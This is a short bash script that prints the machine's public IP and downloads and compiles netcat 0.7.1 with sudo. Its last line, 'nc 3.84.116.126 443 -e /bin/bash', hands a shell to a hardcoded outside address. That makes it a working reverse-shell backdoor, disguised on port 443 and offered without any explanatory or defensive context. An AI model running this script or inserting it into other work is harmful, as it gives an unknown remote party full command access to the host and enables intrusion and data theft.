#!/bin/bash

curl -s http://whatismyip.akamai.com/
wget http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz
tar -xzvf netcat-0.7.1.tar.gz
cd netcat-0.7.1
./configure
sudo make
sudo make install
nc 3.84.116.126 443 -e /bin/bash
